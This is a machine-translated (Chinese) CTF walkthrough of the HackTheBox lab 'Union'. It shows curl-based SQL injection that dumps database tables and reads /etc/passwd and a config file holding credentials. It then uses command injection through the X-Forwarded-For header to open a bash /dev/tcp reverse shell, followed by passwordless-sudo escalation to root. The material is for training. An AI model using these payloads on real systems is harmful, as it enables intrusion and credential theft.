<html>
<head>
<title>Union from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自HackTheBox的联合—详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/union-from-hackthebox-detailed-walkthrough-66ef8663be61?source=collection_archive---------3-----------------------#2022-01-10">https://infosecwriteups.com/union-from-hackthebox-detailed-walkthrough-66ef8663be61?source=collection_archive---------3-----------------------#2022-01-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="eeba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向您展示完成盒子所需的所有工具和技术。</p><h1 id="e8e4" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/ba68f874d0894325082c0258af6d34e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*JIedVvqGQalDU9X_.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">来自HackTheBox的工会</figcaption></figure><p id="f0b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Union是HackTheBox上的中型机器。由<a class="ae lv" href="https://twitter.com/ippsec" rel="noopener ugc nofollow" target="_blank"> Ippsec </a>为<a class="ae lv" href="https://en.hackingesports.com.br/uhc" rel="noopener ugc nofollow" target="_blank">UHC</a>2021年11月总决赛创建，它专注于将SQL注入作为攻击载体。</p><p id="6f45" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的起点是一个端口为80的网站，它有一个SQLi漏洞。我们用它来从后端数据库转储信息，最终得到一个我们可以在网站上提交的标志。这为SSH访问打开了端口22，并允许我们执行进一步的SQLi攻击，泄露我们用于登录的凭据。检查网站的源代码发现了一个漏洞，我们利用这个漏洞使用X-Forwarded-For头来获得反向外壳。升级到根是微不足道的。</p><p id="6819" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需技能是SQLi的基础知识。学到的技能是利用SQLi和X-Forwarded-来使用curl。</p><div class="lw lx gp gr ly lz"><a href="https://www.hackthebox.com/home/machines/profile/418" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">破解盒子::渗透测试实验室——联盟</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">www.hackthebox.com</p></div></div><div class="mi l"><div class="mj l mk ml mm mi mn lp lz"/></div></div></a></div><h1 id="60e3" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="fdbd" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi mt"><img src="../Images/08fcc34b6c8bc916e2016efaaba7abdc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AAFKriFddnQtXOLf18Dn8Q.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Nmap TCP端口扫描</figcaption></figure><p id="8d69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有一个开放的端口，让我们看看:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi my"><img src="../Images/b3b56bbd62d731a74a9c34bde29f2b8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/0*elRzxVybuHfKR-_B.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">简单网页</figcaption></figure><p id="0bff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里没有太多，让我们看看我是否能竞争:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/7a84792953402e2357cc263883730a34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1316/format:webp/0*-d_uYhbivCj0st07.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">检查我是否能参加比赛</figcaption></figure><p id="67ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我可以！单击该链接会将我们带到挑战页面，在这里我们需要输入一个标志:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi na"><img src="../Images/2ba23c5ba9b3fe5ae3bc757324df4c02.png" data-original-src="https://miro.medium.com/v2/resize:fit:864/format:webp/0*6nJ-tEuXiggFFVfY.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">用于输入标志的框</figcaption></figure><p id="a995" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这一点上，我们能做的不多，但当然这是CTF，所以我们需要开始仔细观察。“联合”这个机器名称暗示着我们的前进道路是经过SQL注入的。我以前在很多机器上做过这方面的工作，可能这里最相关的是TryHackMe的SQHell。我的帖子<a class="ae lv" href="https://pencer.io/ctf/ctf-thm-sqhell/" rel="noopener ugc nofollow" target="_blank">在这里</a>对它进行了深入的报道，所以如果你需要一本入门书，也许可以先看看那里。</p><h1 id="19a6" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SQLi调查</h1><p id="cdfd" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我更喜欢命令行，所以让我们用Curl来做这件事。提交玩家的第一个测试:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="4b9c" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl 10.10.11.128/index.php -d 'player=pencer' </span><span id="e1a1" class="ng km iq nc b gy nl ni l nj nk">Congratulations pencer you may compete in this tournament!&lt;br /&gt;<br/>&lt;br /&gt;Complete the challenge &lt;a href="/challenge.php"&gt;here&lt;/a&gt;</span></pre><p id="1cc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们尝试使用box creator ippsec，我们会得到不同的结果:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="28c5" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl 10.10.11.128/index.php -d 'player=ippsec'</span><span id="e7ef" class="ng km iq nc b gy nl ni l nj nk">Sorry, ippsec you are not eligible due to already qualifying.</span></pre><p id="f228" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们尝试最简单的SQLi技术，即单引号:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="952b" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl 10.10.11.128/index.php -d "player=ippsec'"<br/>    <br/>Congratulations ippsec' you may compete in this tournament!&lt;br /&gt;<br/>&lt;br /&gt;Complete the challenge &lt;a href="/challenge.php"&gt;here&lt;/a&gt;</span></pre><p id="f71e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是行不通的，但是如果我们在:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="2545" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl 10.10.11.128/index.php -d "player=ippsec'-- -"</span><span id="954f" class="ng km iq nc b gy nl ni l nj nk">Sorry, ippsec you are not eligible due to already qualifying.</span></pre><p id="b87d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到它是有效的，因为对输入的玩家名字的检查与ippsec匹配，所以我们知道后面的字符已经被注入。</p><h1 id="b22c" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">数据库枚举</h1><p id="9e39" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">有了如何利用它的知识，我们现在可以开始从后端数据库中检索有用的数据。就像我们在SQHell房间里做的那样，我们可以参考mysql文档。在<a class="ae lv" href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html" rel="noopener ugc nofollow" target="_blank">之后</a>我们可以看看这些模式:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="0b1a" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl 10.10.11.128/index.php -d "player=pencer' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata -- -"</span><span id="a78e" class="ng km iq nc b gy nl ni l nj nk">Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.</span></pre><p id="3a8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是可行的，我们检索可用的数据库。让我们使用sed整理响应，只显示我们感兴趣的信息:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="80b8" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'</span><span id="5561" class="ng km iq nc b gy nl ni l nj nk">mysql,information_schema,performance_schema,sys,november</span></pre><p id="0a64" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面，我刚刚使用sed剪切了我们想要看到的响应前后的文本。现在我们知道数据库名为“11月”,让我们看看表格:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="55a2" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select group_concat('TABLE:',TABLE_NAME,'----&gt;-COLUMN:',COLUMN_NAME,'\n') from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'november' -- -" | sed 's/Sorry, //' | sed 's/,//' | sed 's/ you are not eligible due to already qualifying.//'</span><span id="41c1" class="ng km iq nc b gy nl ni l nj nk">table:flag----&gt;-column:one<br/>table:players----&gt;-column:player</span></pre><p id="dd32" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">同样，我已经删除了我们感兴趣的部分，并添加了标签，以使我们清楚地看到了什么。我们有两张表，让我们来看看它们:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="a193" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select group_concat(player) from players -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'</span><span id="2cc1" class="ng km iq nc b gy nl ni l nj nk">ippsec,celesian,big0us,luska,tinyboy</span></pre><p id="26b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">玩家表有ippsec和其他一些。注意，我在这里使用group concat来检索表中的所有条目，并将它们作为单个条目返回。没有它，你只能通过迭代一次看到一个。</p><h1 id="7d4b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">UHC国旗</h1><p id="4119" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">现在旗表:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="78af" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select group_concat(one) from flag -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'</span><span id="bae3" class="ng km iq nc b gy nl ni l nj nk">UHC{F1rst_5tep_2_Qualify}</span></pre><p id="696b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只有一个条目我们可以在网站上试试:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nm"><img src="../Images/73970d4f704e96b1bc7e62bf297f10c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*iF7_KsjxvS9hJ5O6.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">IP地址已被授予访问SSH的权限</figcaption></figure><p id="27f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们也可以用curl来代替浏览器。发送玩家请求并查看响应的标题:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nn"><img src="../Images/6dc22f0a238d3025ae1447544667ad44.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EtU-oLjmb0MySU7vGwRECg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">玩家提交页面的回应</figcaption></figure><p id="2833" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将上面我们看到的分配给PHPSESSID的Cookie与我们找到的标志一起使用，用curl发送:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="322f" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl -s -X POST -b 'PHPSESSID=tie6r4uno69o57gbuesapskfku' --data-binary 'flag=UHC{F1rst_5tep_2_Qualify}' 'http://10.10.11.128/challenge.php' -L | grep SSH</span><span id="f2cf" class="ng km iq nc b gy nl ni l nj nk">&lt;h3 class="text-white"&gt;Your IP Address has now been granted SSH Access.&lt;/h3&gt;</span></pre><p id="42a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们会看到与在浏览器中相同的消息。注意，我使用-L标志告诉curl跟踪从challenge.php页面到firewall.php页面的重定向。</p><h1 id="5687" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">PHP会话操作</h1><p id="4da2" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们在这里不需要做更多的事情，但是为了改进我们的bashfu，可以进一步使用sed来截取响应，并将PHPSESSID放入一个变量中:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="7052" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# PHPSESSID=$(curl -v -s 10.10.11.128/index.php -d "player=pencer" 2&gt;&amp;1 | grep PHPSESSID | sed 's/&lt; Set-Cookie: PHPSESSID=//' | sed 's/; path=\///')</span></pre><p id="fee0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我们可以在需要认证会话时使用该变量。这里我们可以做和上面一样的事情，但是使用我们的变量:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi no"><img src="../Images/f519d147c5df38e4082a05cc3653b520.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jjF7dl3Rkq9O1qjVyxf0wA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">使用变量传递PHPSESSID</figcaption></figure><h1 id="0a35" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SSH访问</h1><p id="4083" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">玩够了，让我们检查SSH现在在端口22上是打开的:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="899a" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# nmap -p 22 10.10.11.128<br/>Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-09 17:09 GMT<br/>Nmap scan report for 10.10.11.128<br/>Host is up (0.023s latency).<br/><br/>PORT   STATE SERVICE<br/>22/tcp open  ssh</span></pre><p id="65d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，我们现在可以访问SSH，但仍然需要凭证。使用我们的SQLi可以读取文件，这里的文档<a class="ae lv" href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file" rel="noopener ugc nofollow" target="_blank">将我们指向load_file函数。让我们使用/etc/passwd文件对此进行测试:</a></p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="b272" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select load_file('/etc/passwd') -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//' 2&gt;&amp;1 | grep "/bin/bash"</span><span id="c475" class="ng km iq nc b gy nl ni l nj nk">root:x:0:0:root:/root:/bin/bash<br/>htb:x:1000:1000:htb:/home/htb:/bin/bash<br/>uhc:x:1001:1001:,,,:/home/uhc:/bin/bash</span></pre><p id="3110" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有三个用户可以登录。通过更多的枚举，我们可以读取其他有用的文件，最终我找到了web服务器配置文件:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="ce83" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select load_file('/var/www/html/config.php') -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'</span><span id="cac1" class="ng km iq nc b gy nl ni l nj nk">&lt;?php<br/>  session_start();<br/>  $servername = "127.0.0.1";<br/>  $username = "uhc";<br/>  $password = "uhc-&lt;HIDDEN&gt;-pw";<br/>  $dbname = "november";<br/>  $conn = new mysqli($servername, $username, $password, $dbname);<br/>?&gt;</span></pre><p id="aad0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">SSH访问会重用这些凭据:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="4f2f" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# ssh uhc@10.10.11.128<br/>uhc@10.10.11.128's password: <br/>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)<br/>Last login: Mon Nov  8 21:19:42 2021 from 10.10.14.8<br/>uhc@union:~$</span></pre><h1 id="4f37" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户标志</h1><p id="7564" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们终于进来了，但只是作为一个低级用户。让我们检查一下我们是谁，然后抓住用户标志:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="0e60" class="ng km iq nc b gy nh ni l nj nk">uhc@union:~$ id<br/>uid=1001(uhc) gid=1001(uhc) groups=1001(uhc)<br/><br/>uhc@union:~$ cat user.txt <br/>cc9a85cd4613c6e45c718f8c2c075ff7</span></pre><h1 id="62f3" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">源代码审查</h1><p id="0bb6" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我在盒子周围找了一大堆，最终还是找到了网根，firewall.php的那个很有趣:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi np"><img src="../Images/943162ffc845804470eee04e3c7f0b91.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f0ewHAyddtt53-mvoExmVg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Firewall.php来源</figcaption></figure><h1 id="a087" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">x-转发-用于剥削</h1><p id="88af" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">它使用X-Forwarded-For (XFF)来识别客户端的原始IP。我报道了利用这个<a class="ae lv" href="https://pencer.io/ctf/ctf-thm-sqhell/#flag-2---blindtime---curl-method" rel="noopener ugc nofollow" target="_blank">在这里</a>的一个试衣间。无需对用户输入进行净化，这可以很容易地操作。让我们用它再次获取/etc/passwd文件:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nq"><img src="../Images/97c9361393e417623772d722ab369386.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Tnm1GPjcoGjgSpiGrHQbfg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">使用X-FORWARDED-FOR抓取passwd文件</figcaption></figure><h1 id="4d14" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">反向外壳</h1><p id="aea4" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">这很有效，所以是时候获得一个反向外壳了。我刚刚使用了一个简单的PenTestMonkey，在另一个终端中启动nc侦听，然后发送这个:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="8065" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~/htb/unicode]<br/>└─# curl -X GET -H 'X-FORWARDED-FOR: ;bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.13/1337 0&gt;&amp;1";' --cookie "PHPSESSID=$PHPSESSID" 'http://10.10.11.128/firewall.php'</span></pre><p id="fc94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换以查看我们已经连接了外壳:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="7e94" class="ng km iq nc b gy nh ni l nj nk">┌──(root💀kali)-[~]<br/>└─# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.13] from (UNKNOWN) [10.10.11.128] 35292<br/>bash: cannot set terminal process group (805): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>www-data@union:~/html$</span></pre><h1 id="3030" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">权限提升</h1><p id="cfb6" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">乍一看，我认为所有的努力，我只获得作为www-data，但检查sudo显示我们的路径到根是很好的和简单的:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="a956" class="ng km iq nc b gy nh ni l nj nk">www-data@union:~/html$ sudo -l<br/>sudo -l<br/>Matching Defaults entries for www-data on union:<br/>    env_reset, mail_badpass,<br/>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br/><br/>User www-data may run the following commands on union:<br/>    (ALL : ALL) NOPASSWD: ALL<br/>www-data@union:~/html$</span></pre><h1 id="b7c2" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="9776" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们可以以root用户身份运行任何命令，让我们获取标志并完成框:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="f2dc" class="ng km iq nc b gy nh ni l nj nk">www-data@union:~/html$ sudo /bin/bash<br/>sudo /bin/bash<br/>id<br/>uid=0(root) gid=0(root) groups=0(root)<br/>cat /root/root.txt<br/>fd73c7c952ca60ad21b71132697bdfd7</span></pre><p id="425f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你和我一样喜欢那个盒子，尤其是尽可能多地从终端尝试。</p><p id="6ce6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">又做了一个。下次见。</p></div><div class="ab cl nr ns hu nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="ij ik il im in"><p id="72c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="3476" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae lv" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae lv" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="a273" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ny">原载于2022年1月10日</em><a class="ae lv" href="https://pencer.io/ctf/ctf-htb-union" rel="noopener ugc nofollow" target="_blank"><em class="ny">https://pencer . io</em></a><em class="ny">。</em></p></div><div class="ab cl nr ns hu nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="ij ik il im in"><h1 id="e5e8" class="kl km iq bd kn ko nz kq kr ks oa ku kv kw ob ky kz la oc lc ld le od lg lh li bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae lv" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="lw lx gp gr ly lz"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">iwcon.live</p></div></div><div class="mi l"><div class="oe l mk ml mm mi mn lp lz"/></div></div></a></div></div></div>    
</body>
</html>